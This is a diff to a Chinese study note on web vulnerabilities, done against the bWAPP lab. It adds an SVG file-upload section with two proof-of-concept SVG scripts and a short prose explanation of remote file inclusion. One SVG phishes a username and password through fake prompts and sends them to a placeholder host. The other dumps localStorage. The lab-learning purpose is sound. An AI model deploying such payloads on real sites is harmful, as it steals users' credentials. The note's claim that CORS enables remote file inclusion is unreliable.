@@ -86,6 +86,56 @@ if (move_uploaded_file($tmpName, $path)) {
 }
 ?>	
 ```
+
+### SVG与文件上传
+
+SVG（**Scalable Vector Graphics**，可缩放矢量图形）是一种基于 XML 的矢量图像格式，用于描述二维图形。它于 2001 年 由 W3C 发布第一版标准，HTML5 将其作为原生支持的一部分纳入。
+
+<img src="./assets/svg_fileupload.png" alt="background" width="533" >
+
+<span style="font-size: 19px;">**PoC**</span>
+
+**靶场：bWAPP_Unrestricted File Upload**
+
+*rect.svg*
+```html
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+    <rect width="100" height="100" />
+    <script>
+        var isChromium = window.chrome,
+        vendorName = window.navigator.vendor,
+        isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+        if(isChromium !== null &amp;&amp; isChromium !== undefined &amp;&amp; vendorName === "Google Inc." &amp;&amp; isOpera == false)
+        {
+            var user = prompt("检测到您正在访问限制内容,请输入您的帐户以登陆帐号");
+            var pass = prompt("请输入您的密码");
+            window.location = "http://www.example.com?user=" + user + "&amp;pass=" + pass;
+        }
+    </script>
+</svg>
+```
+*localstorage.svg*
+```html
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" >
+  <rect width="100" height="100" />
+  <script>
+    if(localStorage.length)
+    {
+        for(key in localStorage)
+        {
+            if(localStorage.getItem(key))
+            {
+                console.log(key) ;
+                console.log(localStorage.getItem(key)) ;
+            }
+        }
+    }
+  </script>
+</svg>
+```
+
 ---
 
 ## File Inclusion
@@ -227,6 +277,14 @@ PHP伪协议能否发挥功能，与PHP配置文件`php.ini`里的两个重要�
 通过`php://`伪协议并结合**filter**功能是读取PHP源码的标准用法，通常采用如下格式：
 - `php://filter/convert.base64-encode/resource=xxx`
 - `php://filter/read=convert.base64-encode/resource=xxx`
+
+### 远程文件包含
+
+**远程文件包含**（Remote File Inclusion，简称 **RFI**）是一种常见的 Web 应用程序漏洞。
+
+它发生在 Web 应用程序（如 PHP、JSP、ASP.NET 等网站）在引入或包含（Include）外部文件时，**没有对用户输入的文件路径进行严格的过滤或限制**，导致攻击者可以传入一个指向远程恶意服务器的 URL，从而让服务器下载并执行该远程恶意文件。
+
+- CORS（跨源资源共享）为远程文件包含提供了可能， 只要建立起源之间的信任关系，就可以触发远程文件包含。
 ---
 
 ## File Download
